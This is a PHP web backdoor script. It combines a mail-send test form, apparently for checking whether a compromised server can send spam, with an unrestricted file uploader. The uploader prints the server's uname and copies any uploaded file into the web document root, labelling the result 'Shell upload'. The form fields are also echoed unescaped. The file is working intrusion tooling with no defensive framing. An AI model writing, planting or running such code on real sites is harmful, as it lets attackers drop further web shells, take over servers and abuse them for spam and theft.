<?php

error_reporting(0);

echo '<b>[Sending test].<b><br><br><form method="post">
<input type="text" placeholder="email" name="email" value="'.$_POST['email'].'">
<input type="text" placeholder="ID" name="orderid" value="'.$_POST['orderid'].'">
<input type="submit" value="Send">
</form>
<br>';

if (!empty($_POST['email'])) {
	if (!empty($_POST['email']) && trim($_POST['orderid']) != '') {
		$rand = trim($_POST['orderid']);
	} else {
		$rand = rand();
	}
	mail(trim($_POST['email']),$_SERVER['HTTP_HOST']." - Sending is Working Fine. [Result] ID: (".$rand.")","[Delivery confirmation].");
	echo '<b>Send an report to ['.$_POST['email'].'] - ID: '.$rand.'</b>';
	echo '<!-- <id>'.$rand.'</id> -->';
}

?><br><?php 
echo "Uname Uploader <br>";
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'><input type='file' name='idx_file'><input type='submit' name='upload' value='upload'></form>"; 
$root = $_SERVER['DOCUMENT_ROOT']; 
$files = $_FILES['idx_file']['name']; 
$dest = $root.'/'.$files; 
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) { 
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "Shell upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "Shell upload in document root.";
		}
	} else {
		if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
			echo "Shell upload <b>$files</b> di folder ini"; 
		} else { 
			echo "Upload Done";
		}
	}
}
?>